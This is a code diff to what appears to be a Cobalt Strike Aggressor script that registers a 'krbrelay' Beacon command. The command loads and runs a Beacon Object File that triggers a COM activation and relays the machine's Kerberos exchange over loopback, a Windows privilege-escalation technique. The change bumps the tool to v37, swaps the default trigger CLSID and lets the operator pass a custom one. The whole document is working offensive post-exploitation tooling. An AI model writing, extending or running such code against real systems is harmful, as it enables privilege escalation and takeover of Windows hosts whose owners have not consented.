@@ -1,18 +1,18 @@
-println("[+] Loaded KrbRelay reusable single-activation BOF v36");
+println("[+] Loaded KrbRelay reusable single-activation BOF v37");
 
 # The two loopback addresses and validated first-use trigger remain internal.
 beacon_command_register(
     "krbrelay",
     "Run one fresh COM activation and relay its machine Kerberos exchange",
-    "Usage: krbrelay <relay_port> <service_spn> <rpc_endpoint>"
+    "Usage: krbrelay <relay_port> <service_spn> <rpc_endpoint> [trigger_clsid]"
 );
 
 alias krbrelay {
-    local('$packed $object $handle');
+    local('$packed $object $handle $trigger');
 
     # The first alias argument is the Beacon ID, leaving three operator values.
-    if (size(@_) != 4) {
-        berror($1, "Usage: krbrelay <relay_port> <service_spn> <rpc_endpoint>");
+    if (size(@_) < 4 || size(@_) > 5) {
+        berror($1, "Usage: krbrelay <relay_port> <service_spn> <rpc_endpoint> [trigger_clsid]");
         return;
     }
 
@@ -25,7 +25,11 @@ alias krbrelay {
     $object = readb($handle, -1);
     closef($handle);
     # int() prevents a numeric port becoming a Machine field.
-    $packed = bof_pack($1, "zizzzz", "127.0.0.1", int($2), $3, "127.0.0.1", $4, "{A9819296-E5B3-4E67-8226-5E72CE9E1FB7}");
-    btask($1, "Running reusable single-activation Kerberos relay BOF v36");
+    $trigger = "{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}";
+    if (size(@_) == 5) {
+        $trigger = $5;
+    }
+    $packed = bof_pack($1, "zizzzz", "127.0.0.1", int($2), $3, "127.0.0.1", $4, $trigger);
+    btask($1, "Running reusable single-activation Kerberos relay BOF v37");
     beacon_inline_execute($1, $object, "go", $packed);
 }
